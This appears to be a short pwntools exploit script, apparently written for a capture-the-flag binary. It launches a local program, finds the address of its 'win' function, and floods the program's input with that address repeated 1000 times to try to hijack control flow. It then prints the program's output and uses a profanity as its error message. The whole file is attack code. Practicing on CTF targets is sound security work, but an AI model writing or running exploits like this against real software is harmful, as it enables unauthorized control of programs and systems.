#!/bin/python
from pwn import *
import sys

binary = sys.argv[1]
p = process(binary)
e = ELF(binary)

p.sendline(str(e.sym['win']).encode('utf-8')*1000)

for i in range(10):
    try:
        print(p.recvline())
    except:
        print("fuck")
